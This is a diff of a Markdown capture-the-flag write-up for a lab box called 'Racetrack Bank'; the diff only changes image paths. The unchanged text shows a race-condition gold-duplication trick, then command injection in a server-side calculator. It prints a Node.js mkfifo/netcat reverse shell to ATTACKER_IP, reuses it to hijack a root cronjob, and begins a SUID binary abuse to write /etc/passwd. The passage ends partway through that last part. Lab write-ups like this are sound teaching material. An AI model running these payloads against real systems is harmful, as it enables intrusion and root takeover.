@@ -41,11 +41,11 @@ There are just two ports open:
 
 We won't be able to do much on SSH without credentials so I head over to enumerate HTTP. Checking the landing page shows that of a typical banking service website. We have the ability to create accounts and there is a message warning that their servers are slow (hint hint).
 
-![](../assets/img/2026-01-30-RacetrackBank/1.png)
+![](/assets/img/2026-01-30-RacetrackBank/1.png)
 
 Logging in shows that we have been granted a singular gold to spend. There are also functions to purchase premium features for 10,000 gold and give gold to another account. I'm guessing that the premium features will let us upload or change something on the site which may be great for our goal.
 
-![](../assets/img/2026-01-30-RacetrackBank/2.png)
+![](/assets/img/2026-01-30-RacetrackBank/2.png)
 
 There's still one problem, we don't have enough gold to buy it. Luckily we have been given a coin and are able to create accounts to be able to give that to. One pretty clear vulnerability arises.
 
@@ -58,28 +58,28 @@ Usually we would need to gain access over another user's account as normal app w
 
 To exploit this, I first make two accounts so we're able to send funds between the two. 
 
-![](../assets/img/2026-01-30-RacetrackBank/3.png)
+![](/assets/img/2026-01-30-RacetrackBank/3.png)
 
 Then, I capture a request to give the gold to that second account, send that to the Repeater tab, add it to a group, and duplicate the request 30 times (you can duplicate it more but it could cause server overload issues).
 
-![](../assets/img/2026-01-30-RacetrackBank/4.png)
+![](/assets/img/2026-01-30-RacetrackBank/4.png)
 
 Lastly, we need to send this group of requests in parallel by expanding the send option and selecting it. This will send almost everything in all packets, wait for them to line up correctly and then send the last byte to complete the process. In turn, this syncs up the requests to be sent extremely fast (not quite at the exact same time but within milliseconds, so the server can't tell them apart). 
 
-![](../assets/img/2026-01-30-RacetrackBank/5.png)
+![](/assets/img/2026-01-30-RacetrackBank/5.png)
 
 After refreshing the second account to see if this exploit succeeded, I find that we now have 15 coins. Race conditions are almost always left up to chance as the server is the one making the error due to timing so half of the requests succeeding is very nice. Our target goal is 10,000 coins so we'll have to repeat this a few times whilst switching accounts, and increasing the amount to the maximum gold we are able to give.
 
-![](../assets/img/2026-01-30-RacetrackBank/6.png)
+![](/assets/img/2026-01-30-RacetrackBank/6.png)
 
 ## Initial Foothold
 After that is taken care of, I buy the premium account package and start enumerating the available functions. There is a new tab which only contains a calculator, kind of a rip off if you ask me but this allows for equations to be executed by the server. 
 
-![](../assets/img/2026-01-30-RacetrackBank/7.png)
+![](/assets/img/2026-01-30-RacetrackBank/7.png)
 
 I test for command injection with a few simple payloads like `whoami`, `/proc/self/environ`, and `sleep 5`, which returns a `504 Gateway Time-Out` error for all. Next, I supply a semicolon to see if we're able to add arbitrary commands to the query.
 
-![](../assets/img/2026-01-30-RacetrackBank/8.png)
+![](/assets/img/2026-01-30-RacetrackBank/8.png)
 
 That returns the answer of 10, confirming we're able to append commands as well. This nginx web server is using the Express framework along with Node.js for the programming language, so I grab a payload from [revshells](https://www.revshells.com/) and replace the command with a mkfifo netcat reverse shell.
 
@@ -90,39 +90,39 @@ require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&
 ## Privilege Escalation
 This gives us a shell on the box as the user brian. I upgrade the shell using the typical python pty method and have a look around for anything useful for our goal of escalating privileges.
 
-![](../assets/img/2026-01-30-RacetrackBank/9.png)
+![](/assets/img/2026-01-30-RacetrackBank/9.png)
 
 There is a cleanup script under Brian's home dir which does removes a test file. This wouldn't be of any interest but it is owned by root user and sometimes scripts are scheduled to run to keep things automated.
 
-![](../assets/img/2026-01-30-RacetrackBank/10.png)
+![](/assets/img/2026-01-30-RacetrackBank/10.png)
 
 I upload [pspy](https://github.com/DominicBreuker/pspy/releases/tag/v1.2.1) to the box using wget and find that there is a cronjob executing this script as root user every so often.
 
-![](../assets/img/2026-01-30-RacetrackBank/11.png)
+![](/assets/img/2026-01-30-RacetrackBank/11.png)
 
 We don't have direct access to write to this script, but since we have generic privileges over the directory, it's possible to delete it outright and replace it with a new script containing a malicious command.
 
 ```
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT>/tmp/f
 ```
-![](../assets/img/2026-01-30-RacetrackBank/12.png)
+![](/assets/img/2026-01-30-RacetrackBank/12.png)
 
 ## Post-Exploitation
 There is a second way to grab root privileges on the box which is way cooler in my opinion. I'll go over how I exploited it to add a new user with root privs.
 
 In the internal enumeration phase, I find a binary named manageaccounts with the SUID bit set under a folder in Brian's home directory. Running the strings utility on it to grab some info on what it does shows an option for 'f' that opens an account file.
 
-![](../assets/img/2026-01-30-RacetrackBank/13.png)
+![](/assets/img/2026-01-30-RacetrackBank/13.png)
 
 Also by running the command, we can see that this binary is used as an API to manage accounts on the website. That 'f' option will read input to the binary and attempt to open an account.
 
-![](../assets/img/2026-01-30-RacetrackBank/14.png)
+![](/assets/img/2026-01-30-RacetrackBank/14.png)
 
 So how do exploit this function to get elevated privileges? We know that by using the 'f' option, the process will spawn a named pipe to the `/tmp` directory for some reason and we're able to have the system read files that end with a .account extension. Since this binary is owned by root and has the SUID bit, if we get it to execute a shell or malicious command, we can do some dangerous things.
 
 I start by creating a file named `cbev.account` under /tmp and testing to see if the binary will access it. It returns a message saying the file read was successful, but doesn't display print stdout. 
 
-![](../assets/img/2026-01-30-RacetrackBank/15.png)
+![](/assets/img/2026-01-30-RacetrackBank/15.png)
 
 The real key to this exploit lies within the write changes function, as this will allow the binary to write anywhere it deems valid using the SUID (being root user). The named pipe got me thinking of how we can get this to write to a sensitive file like `/etc/passwd`.
 
